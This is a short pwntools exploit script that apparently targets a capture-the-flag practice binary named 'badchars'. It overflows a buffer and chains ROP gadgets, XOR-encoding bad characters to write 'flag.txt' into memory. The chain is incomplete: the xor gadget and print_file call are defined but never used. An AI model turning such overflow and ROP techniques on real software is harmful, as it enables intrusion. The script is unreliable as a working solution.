from pwn import * 

p = process('./badchars')


def xor_string(string, key):
    xor_indxs =[]
    output = ""
    for indx, char in enumerate(string):
        if char in badchars:
            nchar = chr(ord(char) ^ key)
            output += nchar
            xor_indxs.append(indx)
            continue
        output += char
    return bytes(output.encode('latin')), xor_indxs

flag = 'flag.txt'
badchars = ['x', 'g', 'a', '.']
key = 2
xoredstr, xor_offsets = xor_string(flag, key)

pops = 0x40069c
mov = 0x400634
xor = 0x400628

pwnme = 0x400500
print_file = 0x400510
bss = 0x601038

x = 0xdeadc0dedeadc0de

payload = b"A" * 40
payload += p64(pops) + xoredstr + p64(bss) + p64(x) + p64(x)
payload += p64(mov)




p.sendline(payload)

p.interactive()
